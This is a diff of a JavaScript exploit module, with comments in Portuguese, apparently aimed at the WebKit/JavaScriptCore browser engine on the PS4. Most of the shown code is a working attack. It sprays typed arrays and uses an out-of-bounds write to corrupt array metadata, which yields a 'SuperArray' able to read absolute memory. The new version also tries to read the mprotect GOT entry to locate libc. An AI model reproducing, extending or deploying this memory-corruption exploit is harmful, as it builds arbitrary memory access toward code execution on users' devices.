@@ -11,200 +11,187 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';
 
-const FNAME_GET_SUPERARRAY_AND_ADDROF = "getSuperArrayAndAttemptAddrof_v22a";
+const FNAME_REPLICATE_SUCCESS = "replicateOriginalSuperArray_v23a";
 
-const CORRUPTION_OFFSET_TRIGGER = 0x70;
+const CORRUPTION_OFFSET_TRIGGER = 0x70; // Onde o trigger principal é escrito
 const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
 
-const FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x50; 
-const PLANTED_M_VECTOR_FOR_SUPERARRAY = new AdvancedInt64(0, 0); // Para m_vector = 0x0
-const PLANTED_M_LENGTH_FOR_SUPERARRAY = 0xFFFFFFFF; // Para m_length enorme
+// Baseado na sua lógica de sucesso e no log onde m_vector@0x68 e m_length@0x70 eram lidos.
+// Usando M_VECTOR_OFFSET = 0x10 e M_LENGTH_OFFSET = 0x18 do seu config.mjs.
+// Para m_vector estar em 0x68: BASE_OFFSET = 0x68 - 0x10 = 0x58.
+// Para m_length estar em 0x70: BASE_OFFSET = 0x70 - 0x18 = 0x58.
+const FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x58; 
 
-const NUM_SPRAY_VIEW_OBJECTS = 500; // Uint32Array(8)
-const ORIGINAL_SPRAY_VIEW_LENGTH = 8;
+const PLANTED_M_VECTOR_SUPERARRAY = new AdvancedInt64(0, 0); // Alvo: m_vector = 0x0
+const PLANTED_M_LENGTH_SUPERARRAY = 0xFFFFFFFF;             // Alvo: m_length = 0xFFFFFFFF
 
-const NUM_SPRAY_TARGET_FUNCS = 100; // Funções para tentar addrof
+const NUM_SPRAY_OBJECTS = 500; // Como nos testes recentes
+const ORIGINAL_SPRAY_LENGTH = 8;
 
-let sprayedVictimViews = [];
-let sprayedTargetFunctions = [];
-let targetFuncToLeak_v22a;
+let sprayedVictimObjects = []; // Para Uint32Arrays pulverizados
 
 // Função para ler QWORD de endereço absoluto usando o superArray (que lê de 0x0)
-function readQwordAbsolute(superArray, address_qword) {
-    if (!superArray || superArray.length !== PLANTED_M_LENGTH_FOR_SUPERARRAY) {
-        throw new Error("SuperArray inválido para leitura absoluta.");
+// (Mesma função readQwordAbsolute do _v22a, pode ser movida para utils.mjs)
+function readQwordAbsolute(superArrayForRead, address_qword_to_read) {
+    if (!superArrayForRead || superArrayForRead.length !== PLANTED_M_LENGTH_SUPERARRAY) {
+        logS3(`[readQwordAbsolute] SuperArray inválido ou length não esperado. Length: ${superArrayForRead ? superArrayForRead.length : 'N/A'}`, "error", FNAME_REPLICATE_SUCCESS);
+        return null;
     }
-    if (!isAdvancedInt64Object(address_qword)) {
-        address_qword = new AdvancedInt64(address_qword); // Tenta converter se for número
-    }
-
-    // No PS4, endereços de heap são < 2^32. Se high part do endereço for 0.
-    if (address_qword.high() !== 0) {
-        logS3(`[readQwordAbsolute] Aviso: Tentando ler de endereço 64-bit ${address_qword.toString(true)} com superArray que pode ser limitado a 32-bit de endereçamento efetivo.`, "warn", FNAME_GET_SUPERARRAY_AND_ADDROF);
-        // Esta implementação de leitura de QWORD de endereço 64-bit com superArray[index 32-bit] é complexa
-        // e depende de como o sistema mapeia memória. Por agora, focar em endereços < 2^32.
-        // Retornar null ou lançar erro se não for possível ler.
-        // Para simplificar, se high não for 0, vamos assumir que não podemos ler confiavelmente.
-        return null; 
+    if (!isAdvancedInt64Object(address_qword_to_read)) {
+        address_qword_to_read = new AdvancedInt64(address_qword_to_read);
     }
 
-    const base_address_low = address_qword.low();
-    if ((base_address_low / 4) + 1 >= superArray.length) { // +1 para ler 2 DWORDs
-        throw new Error(`Endereço ${toHex(base_address_low)} fora dos limites do superArray (length ${toHex(superArray.length)}) para ler QWORD.`);
+    if (address_qword_to_read.high() !== 0) {
+        logS3(`[readQwordAbsolute] Aviso: Tentando ler de endereço 64-bit ${address_qword_to_read.toString(true)} com SuperArray (Uint32Array) que só pode endereçar 4GB (LOW_DWORD). Leitura pode ser incorreta ou falhar.`, "warn", FNAME_REPLICATE_SUCCESS);
+        // Se precisarmos ler endereços > 2^32-1, esta primitiva não é suficiente.
+        // No entanto, para ponteiros de heap do JSC no PS4, a parte alta geralmente é 0.
+        return null;
+    }
+
+    const base_address_low = address_qword_to_read.low();
+    const index_low = base_address_low / 4;
+    const index_high = (base_address_low / 4) + 1;
+
+    if (index_high >= superArrayForRead.length) {
+        logS3(`[readQwordAbsolute] Endereço ${toHex(base_address_low)} fora dos limites do superArray (length ${toHex(superArrayForRead.length)}) para ler QWORD.`, "error", FNAME_REPLICATE_SUCCESS);
+        return null;
     }
     
-    const low_dword = superArray[base_address_low / 4];
-    const high_dword = superArray[(base_address_low / 4) + 1];
-    return new AdvancedInt64(low_dword, high_dword);
+    try {
+        const low_dword = superArrayForRead[index_low];
+        const high_dword = superArrayForRead[index_high];
+        return new AdvancedInt64(low_dword, high_dword);
+    } catch (e) {
+        logS3(`[readQwordAbsolute] Erro ao ler do SuperArray nos índices ${toHex(index_low)}/${toHex(index_high)}: ${e.message}`, "error", FNAME_REPLICATE_SUCCESS);
+        return null;
+    }
 }
 
 
 export async function sprayAndInvestigateObjectExposure() {
-    logS3(`--- Iniciando ${FNAME_GET_SUPERARRAY_AND_ADDROF}: Obter SuperArray (m_vector=0) e tentar Addrof ---`, "test", FNAME_GET_SUPERARRAY_AND_ADDROF);
+    logS3(`--- Iniciando ${FNAME_REPLICATE_SUCCESS}: Replicar Obtenção de SuperArray e Tentar Addrof ---`, "test", FNAME_REPLICATE_SUCCESS);
 
-    sprayedVictimViews = [];
-    sprayedTargetFunctions = [];
-    targetFuncToLeak_v22a = function someUniqueTargetFuncToLeak() { return "target_v22a"; };
+    sprayedVictimObjects = [];
+    let targetFuncForLeak = function aUniqueFunctionTarget() { return "target_v23a"; };
+    let sprayedTargetFunctions = []; // Não usado ativamente para addrof neste teste ainda, mas bom ter.
+    for(let i=0; i<50; i++) sprayedTargetFunctions.push(targetFuncForLeak);
+
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real || !oob_dataview_real) { return; }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
+        logS3("Ambiente OOB inicializado.", "info", FNAME_REPLICATE_SUCCESS);
 
-        // FASE 1: Spray de Uint32Array (vítimas em potencial para superArray)
-        logS3(`FASE 1a: Pulverizando ${NUM_SPRAY_VIEW_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_VIEW_LENGTH})...`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-        for (let i = 0; i < NUM_SPRAY_VIEW_OBJECTS; i++) {
-            const u32arr = new Uint32Array(ORIGINAL_SPRAY_VIEW_LENGTH);
-            u32arr[0] = 0xAAAABBBB ^ i;
-            sprayedVictimViews.push(u32arr);
+        // FASE 1: Spray de Uint32Array
+        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_REPLICATE_SUCCESS);
+        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
+            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
+            u32arr[0] = 0xDEAD0000 ^ i; // Padrão único
+            sprayedVictimObjects.push(u32arr);
         }
-        // Spray de Funções Alvo (para addrof)
-        logS3(`FASE 1b: Pulverizando ${NUM_SPRAY_TARGET_FUNCS} instâncias de targetFuncToLeak_v22a...`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-        for (let i = 0; i < NUM_SPRAY_TARGET_FUNCS; i++) {
-            sprayedTargetFunctions.push(targetFuncToLeak_v22a);
-        }
-        logS3("Pulverização concluída.", "good", FNAME_GET_SUPERARRAY_AND_ADDROF);
+        logS3("Pulverização concluída.", "good", FNAME_REPLICATE_SUCCESS);
 
         // FASE 2: Plantar metadados no oob_array_buffer_real
-        logS3(`FASE 2: Plantando m_vector=${PLANTED_M_VECTOR_FOR_SUPERARRAY.toString(true)}, m_length=${toHex(PLANTED_M_LENGTH_FOR_SUPERARRAY)} em oob_buffer...`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-        const targetMetaVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
-        const targetMetaLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+        // Usando FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB = 0x58
+        // M_VECTOR_OFFSET = 0x10 => 0x58 + 0x10 = 0x68
+        // M_LENGTH_OFFSET = 0x18 => 0x58 + 0x18 = 0x70
+        const actualMetaVectorOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
+        const actualMetaLengthOffset = FOCUSED_VICTIM_ABVIEW_START_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
         
-        oob_write_absolute(targetMetaVectorOffset, PLANTED_M_VECTOR_FOR_SUPERARRAY, 8);
-        oob_write_absolute(targetMetaLengthOffset, PLANTED_M_LENGTH_FOR_SUPERARRAY, 4);
-        logS3(`  Valores plantados em oob_buffer[${toHex(targetMetaVectorOffset)}] e oob_buffer[${toHex(targetMetaLengthOffset)}]`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-        const chk_vec = oob_read_absolute(targetMetaVectorOffset,8);
-        const chk_len = oob_read_absolute(targetMetaLengthOffset,4);
-        logS3(`  Verificação Pós-Plantio: m_vector=${chk_vec.toString(true)}, m_length=${toHex(chk_len)}`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
+        logS3(`FASE 2: Plantando m_vector=${PLANTED_M_VECTOR_SUPERARRAY.toString(true)} em oob_buffer[${toHex(actualMetaVectorOffset)}]`, "info", FNAME_REPLICATE_SUCCESS);
+        oob_write_absolute(actualMetaVectorOffset, PLANTED_M_VECTOR_SUPERARRAY, 8);
+        
+        logS3(`           Plantando m_length=${toHex(PLANTED_M_LENGTH_SUPERARRAY)} em oob_buffer[${toHex(actualMetaLengthOffset)}]`, "info", FNAME_REPLICATE_SUCCESS);
+        oob_write_absolute(actualMetaLengthOffset, PLANTED_M_LENGTH_SUPERARRAY, 4); // m_length é um DWORD
+
+        const chk_vec = oob_read_absolute(actualMetaVectorOffset, 8);
+        const chk_len = oob_read_absolute(actualMetaLengthOffset, 4);
+        logS3(`  Verificação Pós-Plantio (no oob_buffer): m_vector@${toHex(actualMetaVectorOffset)}=${chk_vec.toString(true)}, m_length@${toHex(actualMetaLengthOffset)}=${toHex(chk_len)}`, "info", FNAME_REPLICATE_SUCCESS);
 
 
-        // FASE 3: Trigger
-        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}]...`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
+        // FASE 3: Trigger OOB principal
+        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_REPLICATE_SUCCESS);
         oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
-        logS3("Escrita OOB de trigger realizada.", "good", FNAME_GET_SUPERARRAY_AND_ADDROF);
-        await PAUSE_S3(250); // Pausa maior
+        logS3("Escrita OOB de trigger realizada.", "good", FNAME_REPLICATE_SUCCESS);
+        
+        // Verificar o que está agora nos offsets de metadados plantados DENTRO do oob_buffer
+        // O trigger em 0x70 sobrescreveu o m_length que plantamos em oob_buffer[0x70].
+        const vec_after_trigger_in_oob = oob_read_absolute(actualMetaVectorOffset, 8); // Deve ser 0x0 se não afetado pelo trigger
+        const len_after_trigger_in_oob = oob_read_absolute(actualMetaLengthOffset, 4); // Deve ser 0xFFFFFFFF (low dword do trigger)
+        logS3(`  Valores NO OOB_BUFFER APÓS trigger: m_vector@${toHex(actualMetaVectorOffset)}=${vec_after_trigger_in_oob.toString(true)}, m_length@${toHex(actualMetaLengthOffset)}=${toHex(len_after_trigger_in_oob)}`, "info", FNAME_REPLICATE_SUCCESS);
+        
+        // Se o seu log de sucesso "[22:10:13] m_vector (@0x00000068): 0x00000000_00000000" e 
+        // "m_length (@0x00000070): 0xffffffff" era APÓS O TRIGGER, então o trigger está sobrescrevendo
+        // o m_length no oob_buffer para 0xFFFFFFFF, e o m_vector no oob_buffer continua 0x0.
+        // Isso é o que esperamos que seja copiado para o objeto JS.
 
-        // FASE 4: Identificar SuperArray (Uint32Array com m_vector=0 e length=0xFFFFFFFF)
-        logS3(`FASE 4: Tentando identificar SuperArray (pelo length)...`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
+        await PAUSE_S3(250);
+
+        // FASE 4: Identificar SuperArray (Uint32Array com m_vector=0 e length=PLANTED_M_LENGTH_SUPERARRAY)
+        logS3(`FASE 4: Tentando identificar SuperArray (pelo length)...`, "info", FNAME_REPLICATE_SUCCESS);
         let superArray = null;
         let superArrayIndex = -1;
 
-        for (let i = 0; i < sprayedVictimViews.length; i++) {
-            if (sprayedVictimViews[i] && sprayedVictimViews[i].length === PLANTED_M_LENGTH_FOR_SUPERARRAY) {
-                superArray = sprayedVictimViews[i];
+        for (let i = 0; i < sprayedVictimObjects.length; i++) {
+            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === PLANTED_M_LENGTH_SUPERARRAY) {
+                superArray = sprayedVictimObjects[i];
                 superArrayIndex = i;
-                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_GET_SUPERARRAY_AND_ADDROF);
+                logS3(`    !!!! SUPERARRAY (Uint32Array) ENCONTRADO !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_REPLICATE_SUCCESS);
                 document.title = `SUPERARRAY Idx ${i}!`;
                 break; 
             }
         }
 
         if (superArray) {
-            logS3("  SuperArray obtido. Tentando usá-lo para ler de endereço 0x0 (validar m_vector=0).", "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
+            logS3("  SuperArray obtido. Testando leitura de endereço 0x0 (para validar m_vector=0).", "info", FNAME_REPLICATE_SUCCESS);
             try {
                 const val_at_zero = superArray[0]; // Lê de [0x0]
-                logS3(`    Leitura de teste com SuperArray: superArray[0] (de endereço 0x0) = ${toHex(val_at_zero)}`, "leak", FNAME_GET_SUPERARRAY_AND_ADDROF);
+                logS3(`    Leitura de teste com SuperArray: superArray[0] (de endereço absoluto 0x0) = ${toHex(val_at_zero)}`, "leak", FNAME_REPLICATE_SUCCESS);
                 document.title = `SuperArray LEU 0x0: ${toHex(val_at_zero)}`;
 
-                // SE CHEGARMOS AQUI, TEMOS LEITURA ABSOLUTA A PARTIR DE 0x0!
-                // AGORA TENTAR ADDROF(targetFuncToLeak_v22a)
-                // Isso é difícil porque não sabemos o endereço de targetFuncToLeak_v22a.
-                // Precisaríamos escanear a heap ou usar outra técnica.
+                // SE CHEGAMOS AQUI, TEMOS LEITURA ABSOLUTA A PARTIR DE 0x0!
+                // AGORA TENTAR ADDROF(targetFuncForLeak)
+                // Para um addrof simples, vamos tentar ler o JSCell header de um endereço que *suspeitamos* ser uma função.
+                // Isso ainda requer adivinhar o endereço da função ou escanear a heap.
 
-                // TENTATIVA MAIS DIRETA: Se o "excelente resultado" envolvia a escrita em 0x70
-                // revelando um ponteiro para um objeto JS DENTRO do oob_array_buffer_real (na janela que lemos).
-                logS3("  Re-lendo janela de oob_buffer (usando oob_read_absolute) após tudo, para procurar ponteiros...", "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                let potential_addrof_from_oob_buffer = null;
-                for (let i = 0; i < 8; i++) { // Ler 8 QWORDS da mesma janela de antes
-                    const current_offset_in_oob = LEAK_WINDOW_START_OFFSET + (i * 8); // LEAK_WINDOW_START_OFFSET = 0x50
-                    const qword_val = oob_read_absolute(current_offset_in_oob, 8);
-                    logS3(`    oob_buffer[${toHex(current_offset_in_oob)}] = ${qword_val.toString(true)}`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                    // Aquele valor 0xPLANTED_LOW_DWORD_0x6C_00000000 aparecia em 0x68.
-                    // Vamos verificar se ele ainda está lá e se parece com um ponteiro de heap utilizável (ex: parte alta pequena)
-                    if (current_offset_in_oob === 0x68) {
-                        if (qword_val.low() === 0x0 && qword_val.high() !== 0 && qword_val.high() < 0x7FFFFFFF) { // Heurística: high part não zero mas não FF.., low part zero.
-                            logS3(`    >>>> VALOR INTERESSANTE EM oob_buffer[0x68]: ${qword_val.toString(true)} <<<<`, "vuln", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                            potential_addrof_from_oob_buffer = qword_val;
+                // TENTATIVA DE LER UM PONTEIRO CONHECIDO DA GOT (SE O OFFSET FOR PEQUENO)
+                // Exemplo: WEBKIT_LIBRARY_INFO.GOT_ENTRIES.mprotect é "0x3CBD820" (string)
+                // Convertemos para número. Se o SuperArray puder ler até lá.
+                let mprotect_got_addr_str = WEBKIT_LIBRARY_INFO.GOT_ENTRIES?.mprotect;
+                if (mprotect_got_addr_str) {
+                    const mprotect_got_addr = parseInt(mprotect_got_addr_str, 16);
+                    if (!isNaN(mprotect_got_addr) && (mprotect_got_addr / 4) < superArray.length) {
+                        logS3(`  Tentando ler entrada da GOT de mprotect (${toHex(mprotect_got_addr)}) usando SuperArray...`, "info", FNAME_REPLICATE_SUCCESS);
+                        const mprotect_val_qword = readQwordAbsolute(superArray, new AdvancedInt64(mprotect_got_addr, 0));
+                        if (mprotect_val_qword) {
+                            logS3(`    !!!! VALOR LIDO DA GOT (mprotect @ ${toHex(mprotect_got_addr)}): ${mprotect_val_qword.toString(true)} !!!!`, "vuln", FNAME_REPLICATE_SUCCESS);
+                            document.title = `GOT mprotect: ${mprotect_val_qword.toString(true).slice(-10)}`;
+                            // Se este for um endereço em libc, e soubermos o offset de mprotect em libc, podemos calcular a base da libc.
+                        } else {
+                            logS3(`    Falha ao ler GOT de mprotect com SuperArray ou endereço inválido/fora dos limites.`, "warn", FNAME_REPLICATE_SUCCESS);
                         }
-                    }
-                }
-
-                if (potential_addrof_from_oob_buffer) {
-                    logS3(`  Potencial AddrOf (valor ${potential_addrof_from_oob_buffer.toString(true)}) encontrado em oob_buffer[0x68].`, "vuln", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                    logS3("  Assumindo que SuperArray lê de 0x0, e que este valor é um endereço absoluto < 2^32 (se high part for pequena/kernel).", "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                    
-                    // Se potential_addrof_from_oob_buffer.high() for pequeno (ex: 0, 1, 2 para endereços de PS4)
-                    // e low() for o endereço real.
-                    let address_to_read = potential_addrof_from_oob_buffer.low(); 
-                    if (potential_addrof_from_oob_buffer.high() !== 0) {
-                        logS3(`    Aviso: High part do ponteiro (${toHex(potential_addrof_from_oob_buffer.high())}) não é zero. Leitura pode ser incorreta.`, "warn");
-                        // Para este teste, vamos prosseguir usando apenas a parte baixa se a alta não for gigantesca.
-                        // Ou, se você espera ponteiros de 64 bits, a função readQwordAbsolute precisaria de um SuperArray 64-bit.
-                        // Como SuperArray é Uint32Array, ele só endereça 4GB.
-                        // Se o ponteiro está em 0xHHHHLLLL, e SuperArray lê de 0, então SuperArray[LLLL/4]
-                    }
-
-                    logS3(`  Tentando ler Structure* de ${toHex(address_to_read)} usando SuperArray...`, "info", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                    const structure_ptr_offset_in_obj = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; // 0x8
-                    const addr_of_structure_ptr_field = address_to_read + structure_ptr_offset_in_obj;
-
-                    const structure_ptr_qword = readQwordAbsolute(superArray, new AdvancedInt64(addr_of_structure_ptr_field, 0)); // Ler QWORD
-                    
-                    if (structure_ptr_qword) {
-                        logS3(`    !!!! Structure* LIDO DE ${toHex(addr_of_structure_ptr_field)}: ${structure_ptr_qword.toString(true)} !!!!`, "vuln", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                        document.title = `STRUCTURE* VAZADO: ${structure_ptr_qword.toString(true).slice(-10)}`;
-                        test_results_v19b.structure_ptr_of_target = structure_ptr_qword.toString(true);
-
-                        // Com o Structure*, podemos tentar vazar a base da lib
-                        const executable_ptr_offset_in_struct = JSC_OFFSETS.Structure.CLASS_INFO_OFFSET; // Placeholder! Precisamos do caminho para um ponteiro de código
-                                                                 // Por exemplo, Structure -> ClassInfo -> JSFunction (se for uma estrutura de função) -> Executable
-                                                                 // Ou Structure -> JSGlobalObject -> BuiltinFunction -> Executable
-                        // ESTA PARTE PRECISA DE OFFSETS CORRETOS PARA CHEGAR A UM PONTEIRO DE CÓDIGO
-                        // if (JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET && WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS.some_known_function_call_entrypoint_stub_offset) { ... }
-
                     } else {
-                        logS3(`    Falha ao ler Structure* de ${toHex(addr_of_structure_ptr_field)} usando SuperArray.`, "error", FNAME_GET_SUPERARRAY_AND_ADDROF);
+                        logS3(`    Endereço da GOT de mprotect (${toHex(mprotect_got_addr)}) fora dos limites do SuperArray ou inválido.`, "warn", FNAME_REPLICATE_SUCCESS);
                     }
                 } else {
-                    logS3("  Nenhum valor promissor para addrof encontrado em oob_buffer[0x68] desta vez.", "warn", FNAME_GET_SUPERARRAY_AND_ADDROF);
+                    logS3("    Offset da GOT de mprotect não definido em config.mjs.", "info", FNAME_REPLICATE_SUCCESS);
                 }
 
             } catch (e) {
-                logS3(`    Erro ao usar SuperArray para ler de 0x0: ${e.message}`, "error", FNAME_GET_SUPERARRAY_AND_ADDROF);
-                document.title = "SuperArray ERRO LEITURA 0x0";
+                logS3(`    Erro ao usar SuperArray para ler de 0x0 (ou GOT): ${e.message}`, "error", FNAME_REPLICATE_SUCCESS);
+                document.title = "SuperArray ERRO LEITURA";
             }
         } else {
-            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_GET_SUPERARRAY_AND_ADDROF);
-            document.title = "SuperArray NÃO Encontrado (v22a)";
+            logS3("  Nenhum SuperArray (Uint32Array com length corrompido) identificado.", "error", FNAME_REPLICATE_SUCCESS);
+            document.title = "SuperArray NÃO Encontrado (v23a)";
         }
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO em ${FNAME_GET_SUPERARRAY_AND_ADDROF}: ${e.message}`, "critical", FNAME_GET_SUPERARRAY_AND_ADDROF);
-        document.title = `${FNAME_GET_SUPERARRAY_AND_ADDROF} FALHOU!`;
+        logS3(`ERRO CRÍTICO em ${FNAME_REPLICATE_SUCCESS}: ${e.message}`, "critical", FNAME_REPLICATE_SUCCESS);
+        document.title = `${FNAME_REPLICATE_SUCCESS} FALHOU!`;
     } finally {
-        sprayedVictimViews = [];
-        sprayedTargetFunctions = [];
+        sprayedVictimObjects = [];
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_GET_SUPERARRAY_AND_ADDROF} Concluído ---`, "test", FNAME_GET_SUPERARRAY_AND_ADDROF);
+        logS3(`--- ${FNAME_REPLICATE_SUCCESS} Concluído ---`, "test", FNAME_REPLICATE_SUCCESS);
     }
 }
